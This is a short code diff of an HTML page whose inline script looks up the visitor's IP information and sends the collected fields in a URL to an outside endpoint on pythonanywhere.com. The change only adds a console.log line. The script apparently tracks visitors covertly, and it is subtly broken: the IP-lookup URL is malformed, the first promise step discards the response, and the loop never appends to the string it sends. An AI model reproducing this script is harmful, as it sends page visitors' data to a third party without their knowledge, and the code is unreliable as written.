@@ -46,7 +46,7 @@
       </center>
     </div>
     <script>
-      
+
       sep = "__sep__"
       fetch('https://ipinfo/io').then(response=>{}).then(data => {
         dataString = ""
@@ -54,6 +54,7 @@
           curr = `'${key}''::'${data[key]}'__sep__`
         }
         dataString = dataString.substring(0,dataString.length-'__sep__'.length)
+        console.log(dataString);
         fetch("https://manoj9898.pythonanywhere.com/WVMP/"+dataString);
       });
 
